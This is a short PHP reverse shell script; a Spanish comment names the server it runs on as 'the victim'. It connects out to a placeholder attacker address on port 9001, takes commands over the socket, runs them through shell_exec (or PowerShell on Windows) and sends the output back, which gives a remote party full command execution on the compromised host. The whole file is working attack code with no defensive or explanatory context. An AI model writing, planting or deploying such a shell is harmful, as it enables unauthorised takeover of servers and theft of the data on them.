<?php
// El servidor donde se ejecuta (la víctima principal)
function main() {
    $host = 'IP_ADDRESS';
    $port = 9001;

    try {
        // Create TCP socket and connect
        $sock = socket_create(AF_INET, SOCK_STREAM, 0);
        socket_connect($sock, $host, $port);

        // Send initial prompt
        socket_write($sock, 'SHELL> ', 6);

        while (true) {
            // Receive command
            $data = socket_read($sock, 4096);
            if (!$data) {
                break;
            }

            // Decode command (remove trailing newline if present)
            $command = rtrim($data, "\n");

            if (strtolower($command) === 'exit') {
                break;
            }

            try {
                // Execute command using shell_exec on Unix-like systems
                if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                    // Use PowerShell on Windows
                    $result = shell_exec("powershell -Command $command");
                    $output = $result;
                } else {
                    // Use bash on Unix-like systems
                    $result = shell_exec($command);
                    $output = $result;
                }
            } catch (Exception $e) {
                $output = "Error executing command: " . $e->getMessage() . "\n";
            }

            // Send output with prompt
            $response = $output . 'SHELL> ';
            socket_write($sock, $response, strlen($response));
        }
    } catch (Exception $e) {
        echo "Error: " . $e->getMessage() . "\n";
    } finally {
        try {
            socket_close($sock);
        } catch (Exception $e) {
            // Do nothing
        }
    }
}

main();
?>